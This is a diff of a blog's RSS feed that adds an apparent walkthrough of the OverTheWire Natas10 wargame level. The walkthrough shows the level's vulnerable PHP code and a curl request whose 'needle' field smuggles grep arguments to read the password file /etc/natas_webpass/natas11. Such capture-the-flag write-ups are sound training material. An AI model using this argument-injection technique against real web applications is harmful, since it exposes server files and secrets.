@@ -5,8 +5,81 @@
         <description>Recent content in Posts on Maksymilian Więckowski - blog</description>
         <generator>Hugo -- gohugo.io</generator>
         <language>en</language>
-        <lastBuildDate>Sat, 14 Mar 2026 10:11:00 +0000</lastBuildDate>
+        <lastBuildDate>Sat, 14 Mar 2026 12:11:00 +0000</lastBuildDate>
         <atom:link href="http://localhost:1313/posts/index.xml" rel="self" type="application/rss+xml" />
+        
+        <item>
+            <title>Over the wire - Natas11</title>
+            <link>http://localhost:1313/posts/natas11/</link>
+            <pubDate>Sat, 14 Mar 2026 12:11:00 +0000</pubDate>
+            
+            <guid>http://localhost:1313/posts/natas11/</guid>
+            <description></description>
+            <content type="html"><![CDATA[]]></content>
+        </item>
+        
+        <item>
+            <title>Over the wire - Natas10</title>
+            <link>http://localhost:1313/posts/natas10/</link>
+            <pubDate>Sat, 14 Mar 2026 11:11:00 +0000</pubDate>
+            
+            <guid>http://localhost:1313/posts/natas10/</guid>
+            <description>This one is the same as Natas9, but with a small &amp;ldquo;roadblock&amp;rdquo;.
+Let&amp;rsquo;s check what do we have:
+URL=http://natas10.natas.labs.overthewire.org curl --user natas10:$(cat natas10 ) $URL curl --user natas10:$(cat natas10 ) $URL&amp;#34;/index-source.html&amp;#34; Just gonna show you the important part:
+Output: &amp;lt;pre&amp;gt; &amp;lt;? $key = &amp;#34;&amp;#34;; if(array_key_exists(&amp;#34;needle&amp;#34;, $_REQUEST)) { $key = $_REQUEST[&amp;#34;needle&amp;#34;]; } if($key != &amp;#34;&amp;#34;) { if(preg_match(&amp;#39;/[;|&amp;amp;]/&amp;#39;,$key)) { print &amp;#34;Input contains an illegal character!&amp;#34;; } else { passthru(&amp;#34;grep -i $key dictionary.txt&amp;#34;); } } ?</description>
+            <content type="html"><![CDATA[<p>This one is the same as Natas9, but with a small &ldquo;roadblock&rdquo;.</p>
+<p>Let&rsquo;s check what do we have:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>URL<span style="color:#f92672">=</span>http://natas10.natas.labs.overthewire.org
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>curl --user  natas10:<span style="color:#66d9ef">$(</span>cat natas10 <span style="color:#66d9ef">)</span> $URL
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>curl --user  natas10:<span style="color:#66d9ef">$(</span>cat natas10 <span style="color:#66d9ef">)</span> $URL<span style="color:#e6db74">&#34;/index-source.html&#34;</span>
+</span></span></code></pre></div><p>Just gonna show you the important part:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>Output:
+</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">pre</span>&gt;
+</span></span><span style="display:flex;"><span><span style="color:#75715e">&lt;?
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">$key = &#34;&#34;;
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">if(array_key_exists(&#34;needle&#34;, $_REQUEST)) {
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">    $key = $_REQUEST[&#34;needle&#34;];
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">}
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">if($key != &#34;&#34;) {
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">    if(preg_match(&#39;/[;|&amp;]/&#39;,$key)) {
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">        print &#34;Input contains an illegal character!&#34;;
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">    } else {
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">        passthru(&#34;grep -i $key dictionary.txt&#34;);
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">    }
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">}
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">?&gt;</span>
+</span></span><span style="display:flex;"><span>&lt;/<span style="color:#f92672">pre</span>&gt;
+</span></span></code></pre></div><p>We&rsquo;re dealing with a <strong>preg_match</strong> function that is checking for certain characters.
+Unfortunately, we no longer can use the <strong>;</strong> end command trick to inject some bash commands :c</p>
+<p>But the output is still passed to the <strong>grep</strong> command, meaning we can still use that to our advantage.</p>
+<p><strong>Note</strong>: Check the man pages for <strong>grep</strong>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>man grep
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>NAME
+</span></span><span style="display:flex;"><span>       grep, egrep, fgrep, rgrep - print lines that match patterns
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>SYNOPSIS
+</span></span><span style="display:flex;"><span>       grep <span style="color:#f92672">[</span>OPTION...<span style="color:#f92672">]</span> -e PATTERNS ... <span style="color:#f92672">[</span>FILE...<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Matching Control
+</span></span><span style="display:flex;"><span>   -e PATTERNS, --regexp<span style="color:#f92672">=</span>PATTERNS
+</span></span><span style="display:flex;"><span>          Use PATTERNS as the patterns.  If this option is used multiple times or is combined with the  -f  <span style="color:#f92672">(</span>--file<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>          option, search <span style="color:#66d9ef">for</span> all patterns given.  This option can be used to protect a pattern beginning with “-”.
+</span></span></code></pre></div><p>The answer is right above - in the <strong>man</strong> page.</p>
+<p>We need to create this command:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>grep -i -e <span style="color:#e6db74">&#34;.&#34;</span> /etc/natas_webpass/natas11 dictionary.txt
+</span></span></code></pre></div><p>This way we don&rsquo;t use the <strong>;</strong> end command trick, just use the grep command to search for the key, so the final curl looks like this:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>curl --user natas10:<span style="color:#66d9ef">$(</span>cat natas10 <span style="color:#66d9ef">)</span> $URL -d <span style="color:#e6db74">&#39;needle=-e &#34;.&#34; /etc/natas_webpass/natas11&#39;</span> -d <span style="color:#e6db74">&#34;submit=Submit&#34;</span>  | grep -m <span style="color:#ae81ff">1</span> <span style="color:#e6db74">&#34;webpass&#34;</span> | sed <span style="color:#e6db74">&#34;s/.*://&#34;</span> &gt; natas11
+</span></span></code></pre></div><p>This time the parsing is a little bit different that usual, I advise you to check and learn why that is. (By reading the <strong>man</strong> page and executing the commands yourself)</p>
+<p>On to the next one!</p>
+]]></content>
+        </item>
         
         <item>
             <title>Over the wire - Natas9</title>
